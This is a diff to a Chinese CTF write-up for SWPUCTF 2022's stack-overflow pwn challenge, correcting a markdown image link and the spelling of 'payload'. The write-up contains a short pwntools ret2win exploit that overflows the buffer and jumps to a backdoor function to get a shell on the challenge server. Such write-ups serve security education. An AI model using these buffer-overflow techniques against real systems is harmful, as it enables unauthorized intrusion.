@@ -9,7 +9,7 @@
 # 2.分析
 
 使用IDA打开
-！[alt](/pwn/[SWPUCTF%202022%20新生赛]有手就行的栈溢出_WP/image/image02.png)
+![alt](/pwn/[SWPUCTF%202022%20新生赛]有手就行的栈溢出_WP/image/image02.png)
 
 主函数调用了overflow函数，且该函数内部存在栈溢出漏洞
 
@@ -36,12 +36,12 @@ fun为真后门，可通过其拿到shell
 ```python
 from pwn import * #引用pwntools库
 p = remote("node4.anna.nssctf.cn",25012) #配置nc链接
-playload = b'a'*(0x20+8)+p64(0x401257) 
+payload = b'a'*(0x20+8)+p64(0x401257) 
 #p64就是8字节打包（针对64位程序），p32是4字节打包（针对32位程序）
 p.sendline(payload) #发送攻击字符串
 p.interactive() #与程序交互
 
 ```
 
-构建playload目的为填充缓冲区与rbp，并将原返回地址覆盖为后门地址
+构建payload目的为填充缓冲区与rbp，并将原返回地址覆盖为后门地址
 最终可获取Shell并找到flag
